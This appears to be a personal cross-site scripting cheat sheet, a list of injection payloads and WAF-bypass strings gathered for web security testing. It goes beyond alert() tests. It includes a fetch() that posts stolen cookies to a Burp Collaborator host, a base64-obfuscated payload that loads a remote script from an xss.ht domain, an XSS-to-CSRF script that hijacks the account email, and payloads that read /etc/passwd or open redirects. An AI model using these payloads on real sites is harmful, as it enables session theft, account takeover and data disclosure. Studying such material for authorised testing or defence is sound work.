# XSS

Cheat Sheet : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

"sink" refers to a point in the code where user-controlled data is incorporated into the web page's HTML or JavaScript

`<script>alert(1)</script>`

`"><svg onload=alert(1)>`

`<img src=1 onerror=alert(1)>`

`javascript:alert(document.cookie)`  -- In href senario

`"onmouseover="alert(1)`

`javascript:alert(1)`

`'-alert(1)-'`

`<img%20src=1%20onerror=alert(1)>`

`{{$on.constructor('alert(1)')()}}`  - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`\"-alert(1)}//` - DOM

`<><img src=1 onerror=alert(1)>`  - where 1st angle brackets are removed by server

`<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'` Custom tags

`<svg><animatetransform onbegin=alert(1)>`  SVG Injection to XSS

`</script><script>alert(1)</script>`  single quote and backslash escaped

`\'-alert(1)//` angle brackets and double quotes HTML-encoded and single quotes escaped

`${alert(1)}` into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

`<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`   To Steal Cookies, cookies will be send to us.

XSS to CSRF:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>` Reflected XSS with event handlers and href attributes blocked

`<>javascript:alert(document.cookie);`

`<>//google.com` - open redirect

`<script> window.location.href = 'https://malicious-site.com'; </script>`  Open Redirect via XSS

---

`>>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta` reflected input

`var a = document[.]querySelector('[nonce]');` 
![[Pasted image 20240527171129.png]]


```
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>  
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>  
<math><x xlink:href=javascript:confirm`1`>click  
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/  
<svg onload=alert&#0000000040document.cookie)>  
  
JavaScript://%250Aalert?.(1)//  
'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->  
</Title/</Style/</Script/</textArea/</iFrame/</noScript>  
\74k<K/contentEditable/autoFocus/OnFocus=  
/*${/*/;{/**/(alert)(1)}//><Base/Href=//[google.com](http://google.com/)\76-->  
  
  
<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//  
  
xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>  
  
javascript:%ef%bb%bfalert(XSS)  
  
<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">  
  
<svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">  
  
"><video><source onerror=eval(atob([http://this.id](http://this.id/))) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>  
  
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;  
  
  
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>  
  
"`'><script>\xE2\x80\x87javascript:alert(1)</script>  
  
  
<img/src=x onError="`${x}`;alert(`Hello`);">  
"`'><script>\xE2\x80\x87javascript:alert(1)</script>  
  
"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F  
  
"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>  
  
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
```

XSS payload to get /etc/passwd file 

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](http://x.open/)(‘GET’,’file:///etc/hosts’);x.send();</script>


<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](http://x.open/)(‘GET’,’file:///etc/passwd’);x.send();</script>


<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](http://x.open/)(‘GET’,’file:///some/file’);x.send();</script>
```

XSS to SSRF

```
Input the following code in the vulnerable field:  
<iframe src="http://localhost/some/directory"></iframe>  
  
You can also read local files:  
<iframe src="file:///C:/Windows/win.ini" width="500" height="500">
```

Reflected XSS

`abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e`  --> 

```
abc`;return+false});});alert`xss`;</script>
```

`%60%2balert/**/(1)%2b%60`  --> `+alert/**/(1)+` 

WAF Bypass

`<ScRiPt></sCrIpT>`

`<h1 oNLY OnMouseover=prompt('XSS')>`

`+%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--`

`<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>`


